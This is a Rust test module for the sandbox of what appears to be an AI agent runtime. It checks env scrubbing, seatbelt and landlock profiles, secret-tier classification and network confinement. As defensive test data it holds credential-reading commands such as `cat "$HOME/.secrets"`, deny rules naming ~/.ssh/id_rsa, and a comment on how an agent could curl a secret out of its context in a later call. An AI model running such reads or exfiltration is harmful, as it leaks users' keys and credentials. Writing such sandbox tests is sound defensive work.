            ToolOrigin::AutoSkill,
            ToolOrigin::ScriptBlock,
            ToolOrigin::Delegated,
        ] {
            assert_eq!(
                origin.required_isolation(),
                IsolationMode::Jailed,
                "{origin:?} must be jailed"
            );
        }
    }

    #[test]
    fn isolation_labels_and_backend_requirement() {
        assert_eq!(IsolationMode::Host.as_label(), "host");
        assert_eq!(IsolationMode::Jailed.as_label(), "jailed");
        assert!(!IsolationMode::Host.requires_backend());
        assert!(IsolationMode::Jailed.requires_backend());
    }

    // -- macOS seatbelt profile generation --

    #[cfg(target_os = "macos")]
    #[test]
    fn seatbelt_profile_denies_by_default_and_scopes_writes() {
        let profile = seatbelt_profile(Path::new("/tmp/faejail-root"));
        assert!(profile.contains("(deny default)"), "{profile}");
        assert!(profile.contains("(allow file-read*)"), "{profile}");
        assert!(profile.contains("(allow file-write*"), "{profile}");
        // The root appears as a write subpath.
        assert!(
            profile.contains("(subpath \"/tmp/faejail-root\")"),
            "{profile}"
        );
        // Temp dirs are write-allowed so commands can use $TMPDIR.
        assert!(profile.contains("(subpath \"/private/tmp\")"), "{profile}");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn seatbelt_quote_escapes_quotes_and_backslashes() {
        assert_eq!(seatbelt_quote("/a/b"), "\"/a/b\"");
        assert_eq!(seatbelt_quote("/a\"b"), "\"/a\\\"b\"");
        assert_eq!(seatbelt_quote("/a\\b"), "\"/a\\\\b\"");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn sh_single_quote_escapes_embedded_quote() {
        assert_eq!(sh_single_quote("abc"), "'abc'");
        // A single quote is closed, escaped, and reopened.
        assert_eq!(sh_single_quote("a'b"), "'a'\\''b'");
    }

    // -- macOS env-scrub prefix (C1) --

    #[cfg(target_os = "macos")]
    #[test]
    fn env_i_prefix_starts_with_env_dash_i_and_omits_secrets() {
        // Plant a provider secret; the `env -i` prefix must clear it while
        // keeping PATH so the sandboxed shell can still find its binaries.
        // Value built by concatenation so no secret-shaped literal reaches git.
        let secret = format!("{}-{}", "planted", "must-not-leak-abc123");
        std::env::set_var("FAE_OPENROUTER_API_KEY", &secret);
        let prefix = scrubbed_env_i_prefix();
        std::env::remove_var("FAE_OPENROUTER_API_KEY");

        assert!(
            prefix.starts_with("/usr/bin/env -i "),
            "prefix must clear the env via `env -i`: {prefix}"
        );
        // The secret value never appears in the argv prefix.
        assert!(!prefix.contains(&secret), "secret leaked into prefix");
        assert!(
            !prefix.contains("FAE_OPENROUTER_API_KEY"),
            "secret var name leaked into prefix: {prefix}"
        );
        // PATH survives (single-quoted `PATH=...`) so the child can exec.
        assert!(
            prefix.contains("'PATH="),
            "PATH dropped from prefix: {prefix}"
        );
    }

    /// End-to-end: run a real jailed `exec` under `exec_jailed_macos` and prove a
    /// planted `FAE_OPENROUTER_API_KEY` is absent from the jailed shell's view —
    /// the macOS twin of the Linux jail's env scrub. nextest runs each test in
    /// its own process, so the process-global env plant is race-free under the
    /// gate.
    #[cfg(target_os = "macos")]
    #[test]
    fn jailed_macos_exec_does_not_expose_planted_api_key() {
        let dir = tempfile::tempdir().expect("tempdir");
        let real = std::fs::canonicalize(dir.path()).expect("canonicalize");
        let root = real.clone();

        let secret = format!("{}-{}", "planted", "must-not-leak-xyz789");
        std::env::set_var("FAE_OPENROUTER_API_KEY", &secret);

        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("rt");
        let result = rt.block_on(async {
            let inner = LocalSessionEnv::new(root.clone(), fluers_runtime::Limits::default())
                .await
                .expect("inner env");
            let jail = JailedSessionEnv::new(Arc::new(inner), root.clone());
            // A command with quotes/spaces/`$VAR` exercising the escaping: it
            // prints the secret var if present, else the sentinel.
            let cmd = "printf '%s' \"${FAE_OPENROUTER_API_KEY:-__ABSENT__}\"";
            jail.exec(cmd, Path::new("."), Some(10_000), &CancellationToken::new())
                .await
                .expect("jailed exec")
        });

        std::env::remove_var("FAE_OPENROUTER_API_KEY");

        assert_eq!(result.exit_code, 0, "jailed exec failed: {result:?}");
        assert!(
            !result.stdout.contains(&secret),
            "planted API key leaked into jailed stdout: {:?}",
            result.stdout
        );
        assert_eq!(
            result.stdout.trim(),
            "__ABSENT__",
            "jailed shell saw the secret (expected sentinel): {:?}",
            result.stdout
        );
    }

    // -- macOS Host-tier bash read-deny profile (C2) --

    #[cfg(target_os = "macos")]
    #[test]
    fn read_deny_profile_allows_default_and_denies_protected_reads() {
        let profile = read_deny_seatbelt_profile("/Users/tester");
        // General allow keeps legitimate bash working.
        assert!(profile.contains("(allow default)"), "{profile}");
        // Reads of the protected set are denied (last-match wins).
        assert!(profile.contains("(deny file-read*"), "{profile}");
        // Representative protected paths appear as deny subpaths.
        assert!(
            profile.contains("(subpath \"/Users/tester/.secrets\")"),
            "{profile}"
        );
        assert!(
            profile.contains("(subpath \"/Users/tester/.ssh\")"),
            "{profile}"
        );
        assert!(
            profile.contains(
                "(subpath \"/Users/tester/Library/Application Support/fae/speakers.json\")"
            ),
            "{profile}"
        );
        // The profile does NOT globally deny reads (that would break bash).
        assert!(
            !profile.contains("(deny file-read*)"),
            "profile must not deny ALL reads: {profile}"
        );
    }

    // -- security-override: daemon tier classifier (L3) --

    #[test]
    fn tier_classifier_precedence_and_membership() {
        let dir = tempfile::tempdir().expect("tempdir");
        let home = std::fs::canonicalize(dir.path()).expect("canon home");
        let home_str = home.to_string_lossy().into_owned();
        let plant = |rel: &str| -> PathBuf {
            let p = home.join(rel);
            if let Some(parent) = p.parent() {
                std::fs::create_dir_all(parent).expect("mkdir");
            }
            std::fs::write(&p, b"x").expect("write");
            std::fs::canonicalize(&p).expect("canon target")
        };
        // Secrets: a file UNDER ~/.ssh (the member is a directory) classifies Secrets.
        let ssh_key = plant(".ssh/id_rsa");
        assert_eq!(
            classify_canonical_tier(&ssh_key, &home_str),
            SecurityTier::Secrets
        );
        // Secrets: the ~/.secrets file itself.
        let secrets = plant(".secrets");
        assert_eq!(
            classify_canonical_tier(&secrets, &home_str),
            SecurityTier::Secrets
        );
        // Fae-Integrity: models.lock + grant-store (newly ADDED to the never set).
        let models_lock = plant("Library/Application Support/fae/models.lock");
        assert_eq!(
            classify_canonical_tier(&models_lock, &home_str),
            SecurityTier::FaeIntegrity
        );
        let grant_store = plant("Library/Application Support/fae/grant-store.json");
        assert_eq!(
            classify_canonical_tier(&grant_store, &home_str),
            SecurityTier::FaeIntegrity
        );
        // Fae-Integrity: a file UNDER ~/.fae-vault — strictest tier wins.
        let vault_file = plant(".fae-vault/objects/x");
        assert_eq!(
            classify_canonical_tier(&vault_file, &home_str),
            SecurityTier::FaeIntegrity
        );
        // General: any other file.
        let general = plant("project/notes.txt");
        assert_eq!(
            classify_canonical_tier(&general, &home_str),
            SecurityTier::General
        );
    }

    // -- security-override: relaxed read-deny profile (L4/L5) --

    #[cfg(target_os = "macos")]
    #[test]
    fn absent_override_profile_byte_identical_to_baseline() {
        // Invariant F: no override ⇒ the profile is byte-for-byte the full-deny
        // baseline (the override mechanism adds ZERO relaxation when absent).
        let home = "/Users/tester";
        let baseline = read_deny_seatbelt_profile(home);
        let none = read_deny_seatbelt_profile_relaxed(home, None, None);
        assert_eq!(
            baseline, none,
            "absent override must equal baseline verbatim"
        );
        // The wrapped command embeds exactly that baseline profile.
        let wrapped = wrap_host_bash_command("echo hi", Some(home), None, None).expect("wrap");
        assert!(
            wrapped.contains(&sh_single_quote(&baseline)),
            "wrapped command must embed the baseline profile verbatim: {wrapped}"
        );
        // No relaxation-only constructs leak into the un-overridden profile.
        assert!(!none.contains("(deny network*)"), "{none}");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn secrets_unlock_denies_network_and_relaxes_only_target() {
        // A Secrets-tier relax maps to (relax_target, network_confine=workspace)
        // in `wrap_host_bash_command`; exercise the profile builder with exactly
        // that mapping.
        let home = "/Users/tester";
        let profile = read_deny_seatbelt_profile_relaxed(
            home,
            Some(Path::new("/Users/tester/.secrets")),
            Some(Path::new("/tmp/ws-root")),
        );
        // L5: network denied + writes confined to workspace + temp.
        assert!(profile.contains("(deny network*)"), "{profile}");
        assert!(
            profile.contains("(deny file-write* (subpath \"/\"))"),
            "{profile}"
        );
        assert!(profile.contains("(subpath \"/tmp/ws-root\")"), "{profile}");
        // The named secret is relaxed (removed from the read-deny set)…
        assert!(
            !profile.contains("(subpath \"/Users/tester/.secrets\")"),
            "target secret must be relaxed: {profile}"
        );
        // …but every OTHER protected path stays denied.
        assert!(
            profile.contains("(subpath \"/Users/tester/.ssh\")"),
            "{profile}"
        );
        assert!(
            profile.contains(
                "(subpath \"/Users/tester/Library/Application Support/fae/models.lock\")"
            ),
            "{profile}"
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn general_unlock_keeps_network_and_denies_protected() {
        // A General-tier relax (deny_network=false, untainted turn) maps to
        // (relax_target, network_confine=None).
        let home = "/Users/tester";
        let profile = read_deny_seatbelt_profile_relaxed(
            home,
            Some(Path::new("/Users/tester/project/notes.txt")),
            None,
        );
        // General: network stays allowed (no deny), no write clampdown.
        assert!(!profile.contains("(deny network*)"), "{profile}");
        assert!(
            !profile.contains("(deny file-write* (subpath \"/\"))"),
            "{profile}"
        );
        // Protected set still fully denied (the target was never in it).
        assert!(
            profile.contains("(subpath \"/Users/tester/.secrets\")"),
            "{profile}"
        );
        assert!(
            profile.contains("(subpath \"/Users/tester/.ssh\")"),
            "{profile}"
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn relax_is_file_granular_dir_secret_child_stays_denied() {
        // A relaxation naming a file UNDER a directory-secret (~/.ssh/id_rsa) must
        // NOT remove the ~/.ssh subpath deny — the child stays blocked (the removal
        // is exact-leaf only, never a directory prefix). This is the canonical-escape
        // defense: a workspace symlink→~/.ssh/id_rsa canonicalizes under ~/.ssh and
        // stays denied.
        let home = "/Users/tester";
        let profile = read_deny_seatbelt_profile_relaxed(
            home,
            Some(Path::new("/Users/tester/.ssh/id_rsa")),
            Some(Path::new("/tmp/ws-root")),
        );
        assert!(
            profile.contains("(subpath \"/Users/tester/.ssh\")"),
            "directory-secret must stay denied — relaxation is file-granular: {profile}"
        );
    }

    // -- security-override FLAW-1: turn-taint network confinement --

    #[cfg(target_os = "macos")]
    #[test]
    fn network_denied_plain_bash_denies_network_and_relaxes_no_read_leaf() {
        // FLAW-1 (same-turn split-call exfil): a PLAIN Host bash carrying the
        // turn-taint flag runs network-denied + workspace-write-only WITHOUT any
        // read leaf being lifted — the secret already in model context cannot be
        // curl'd out (or spilled outside the workspace) by a later call in the
        // same turn.
        let home = "/Users/tester";
        let profile =
            read_deny_seatbelt_profile_relaxed(home, None, Some(Path::new("/tmp/ws-root")));
        // Network cut + writes clamped to workspace + temp.
        assert!(profile.contains("(deny network*)"), "{profile}");
        assert!(
            profile.contains("(deny file-write* (subpath \"/\"))"),
            "{profile}"
        );
        assert!(profile.contains("(subpath \"/tmp/ws-root\")"), "{profile}");
        // NO read leaf relaxed: the full protected read-deny set stays intact.
        let baseline = read_deny_seatbelt_profile(home);
        for line in baseline.lines().filter(|l| l.contains("(subpath")) {
            assert!(
                profile.contains(line),
                "tainted profile must keep every baseline read-deny entry: missing {line}"
            );
        }
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn network_denied_wraps_confined_profile_absent_flag_byte_identical() {
        let home = "/Users/tester";
        // Tainted: the wrapped command embeds a network-denied profile.
        let tainted =
            wrap_host_bash_command("echo hi", Some(home), None, Some(Path::new("/tmp/ws-root")))
                .expect("wrap");
        let expected =
            read_deny_seatbelt_profile_relaxed(home, None, Some(Path::new("/tmp/ws-root")));
        assert!(
            tainted.contains(&sh_single_quote(&expected)),
            "tainted wrap must embed the network-denied profile verbatim: {tainted}"
        );
        // Absent flag ⇒ byte-identical to today's un-overridden wrap (Invariant F).
        let plain = wrap_host_bash_command("echo hi", Some(home), None, None).expect("wrap");
        let baseline = read_deny_seatbelt_profile(home);
        assert!(
            plain.contains(&sh_single_quote(&baseline)),
            "absent network_denied must embed the byte-identical baseline: {plain}"
        );
        assert_ne!(tainted, plain);
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn wrap_host_bash_fails_closed_without_home() {
        // No home ⇒ the protected set cannot be derived ⇒ refuse (never run an
        // unguarded bash that could read `~/.secrets`).
        assert_eq!(
            wrap_host_bash_command("echo hi", None, None, None),
            Err("host_bash_home_unresolved")
        );
        assert_eq!(
            wrap_host_bash_command("echo hi", Some(""), None, None),
            Err("host_bash_home_unresolved")
        );
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn wrap_host_bash_wraps_env_scrub_and_sandbox_and_quotes() {
        // With a home + sandbox-exec present (stock macOS), the wrapper scrubs the
        // env, invokes the seatbelt driver, and single-quotes the original command.
        let wrapped =
            wrap_host_bash_command("cat \"$HOME/.secrets\"", Some("/Users/tester"), None, None)
                .expect("wrap");
        assert!(
            wrapped.starts_with("/usr/bin/env -i "),
            "must clear env: {wrapped}"
        );
        assert!(
            wrapped.contains("/usr/bin/sandbox-exec -p "),
            "must invoke the seatbelt driver: {wrapped}"
        );
        // The original command is single-quoted (its embedded double-quotes are
        // literal, not shell-active).
        assert!(
            wrapped.contains("/bin/sh -c 'cat \"$HOME/.secrets\"'"),
            "original command must be single-quoted verbatim: {wrapped}"
        );
    }

    // -- Linux landlock ruleset construction --

    #[cfg(target_os = "linux")]
    #[test]
    fn landlock_ruleset_builds_when_supported() {
        if !jail_backend_available() {
            eprintln!("skip: landlock unavailable on this kernel");
            return;
        }
        let dir = tempfile::tempdir().expect("tempdir");
        let real = std::fs::canonicalize(dir.path()).expect("canonicalize");
        // Construction must succeed (opens the root path fd + folds the rule).
        build_write_confined_ruleset(&real).expect("ruleset build");
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn resolve_cwd_rejects_escapes_and_joins_relative() {
        let dir = tempfile::tempdir().expect("tempdir");
        let real = std::fs::canonicalize(dir.path()).expect("canonicalize");
        // A concrete inner env is not needed to exercise resolve_cwd; build a
        // JailedSessionEnv over a throwaway inner is awkward here, so test the
        // path arithmetic via a standalone helper mirror is unnecessary — assert
        // through a constructed env would require async. Instead validate the
        // component rules directly on a scratch path join.
        let jail = futures_probe_env(&real);
        assert!(jail.resolve_cwd(Path::new("..")).is_err());
        assert!(jail.resolve_cwd(Path::new("/abs")).is_err());
        let joined = jail.resolve_cwd(Path::new("sub/dir")).expect("relative ok");
        assert_eq!(joined, real.join("sub").join("dir"));
        let dot = jail.resolve_cwd(Path::new(".")).expect("dot ok");
        assert_eq!(dot, real);
    }

    #[cfg(target_os = "linux")]
    fn futures_probe_env(real_root: &Path) -> JailedSessionEnv {
        // A JailedSessionEnv whose inner env is never invoked (resolve_cwd is
        // pure path arithmetic over `root`). Build the inner synchronously via a
        // tiny runtime so the helper stays non-async.
        let root = real_root.to_path_buf();
        let inner = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .expect("rt")
            .block_on(async {
                LocalSessionEnv::new(root.clone(), fluers_runtime::Limits::default())
                    .await
                    .expect("inner env")
            });
        JailedSessionEnv::new(Arc::new(inner), root)
    }
}
